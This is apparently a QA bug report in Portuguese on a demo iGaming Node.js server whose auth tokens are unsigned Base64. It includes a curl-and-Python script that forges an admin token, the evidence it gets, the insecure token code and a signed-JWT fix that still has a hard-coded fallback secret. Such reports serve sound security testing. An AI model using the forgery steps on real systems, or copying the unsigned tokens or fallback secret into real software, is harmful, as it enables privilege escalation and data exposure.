# BUG-002 — JWT sem assinatura permite escalação de privilégio (Privilege Escalation)

| Campo          | Valor                                         |
|----------------|-----------------------------------------------|
| **ID**         | BUG-002                                       |
| **Módulo**     | Autenticação — Controle de Acesso             |
| **Severidade** | **Crítica**                                   |
| **Prioridade** | **P0**                                        |
| **Status**     | Aberto                                        |
| **Encontrado** | 2026-07-09                                    |
| **CWE**        | CWE-347 — Improper Verification of Cryptographic Signature |
| **OWASP**      | A07:2021 — Identification and Authentication Failures |
| **Ambiente**   | demo-igaming localhost:3000 (Node.js/Express) |

---

## Resumo

O servidor gera tokens de autenticação usando **Base64 puro** (sem assinatura HMAC/RSA). Qualquer usuário autenticado pode **forjar um token com `role: 'admin'`** e obter acesso total ao painel de administração, incluindo dados financeiros agregados de todos os tenants.

---

## Passos para Reproduzir

```bash
# 1. Autenticar como player01 (role: player)
TOKEN=$(curl -s http://localhost:3000/api/auth/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"player01","password":"Senha@123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token original:"
echo $TOKEN | python3 -c "import sys,base64; print(base64.b64decode(sys.stdin.read().strip()+'==').decode())"
# {"username":"player01","role":"player","exp":1783668596697}

# 2. Forjar token alterando role para 'admin'
FORJADO=$(echo $TOKEN | python3 -c "
import sys, base64, json
t = sys.stdin.read().strip()
d = json.loads(base64.b64decode(t+'==').decode())
d['role'] = 'admin'
print(base64.b64encode(json.dumps(d).encode()).decode())
")

echo "Token forjado:"
echo $FORJADO | python3 -c "import sys,base64; print(base64.b64decode(sys.stdin.read().strip()+'==').decode())"
# {"username": "player01", "role": "admin", "exp": 1783668596697}

# 3. Acessar endpoint protegido (GET /api/admin/tenants) com token forjado
curl -s http://localhost:3000/api/admin/tenants \
  -H "Authorization: Bearer $FORJADO"
```

---

## Resultado Esperado

```json
{ "error": "Acesso negado" }
```
Status HTTP: `403`

---

## Resultado Obtido

```json
{
  "tenants": [
    { "id": "operadora-a", "name": "Operadora A", "userCount": 42, "totalBalance": 52000 },
    { "id": "operadora-b", "name": "Operadora B", "userCount": 18, "totalBalance": 25000 }
  ]
}
```
Status HTTP: **`200 OK`** — acesso total concedido com token forjado.

---

## Evidência (output do terminal — 2026-07-09)

```
=== Token original (player): ===
{"username":"player01","role":"player","exp":1783668596697}

=== Token forjado (admin): ===
{"username": "player01", "role": "admin", "exp": 1783668596697}

=== Resultado acesso admin com token forjado: ===
{
    "tenants": [
        {
            "id": "operadora-a",
            "name": "Operadora A",
            "userCount": 42,
            "totalBalance": 52000
        },
        {
            "id": "operadora-b",
            "name": "Operadora B",
            "userCount": 18,
            "totalBalance": 25000
        }
    ]
}
```

---

## Causa Raiz

Arquivo: `demo-igaming/server.js`

```js
// IMPLEMENTAÇÃO INSEGURA — token é apenas Base64, sem assinatura
const createToken = (username, role) =>
  Buffer.from(JSON.stringify({ username, role, exp: Date.now() + 86_400_000 }))
    .toString('base64');   // ← só codifica, NÃO assina

const decodeToken = (token) => {
  try {
    return JSON.parse(Buffer.from(token, 'base64').toString());
    // ← qualquer payload válido em Base64 é aceito sem verificação de integridade
  } catch { return null; }
};
```

Não há verificação criptográfica do conteúdo. O servidor confia totalmente no payload decodificado.

---

## Correção Sugerida

Usar **JWT com assinatura HMAC-SHA256** via `jsonwebtoken`:

```bash
npm install jsonwebtoken
```

```js
const jwt = require('jsonwebtoken');
const SECRET = process.env.JWT_SECRET || 'trocar-por-secret-forte-em-producao';

const createToken = (username, role) =>
  jwt.sign({ username, role }, SECRET, { expiresIn: '24h' });

const decodeToken = (token) => {
  try {
    return jwt.verify(token, SECRET);   // ← valida assinatura, lança erro se inválido
  } catch { return null; }
};
```

**Adicionalmente:**
- Armazenar `JWT_SECRET` como variável de ambiente (nunca no código)
- Usar `RS256` em produção (par de chaves pública/privada)
- Adicionar jti (JWT ID) para suporte a revogação

---

## Impacto

- **Confidencialidade**: Player obtém dados financeiros de todos os tenants
- **Integridade**: Player pode executar operações administrativas (switch tenant, etc.)
- **Regulatório**: Violação de isolamento de dados entre tenants (LGPD, PCI-DSS)
- **Classificação OWASP**: A07 — Falha de Autenticação (Crítico)
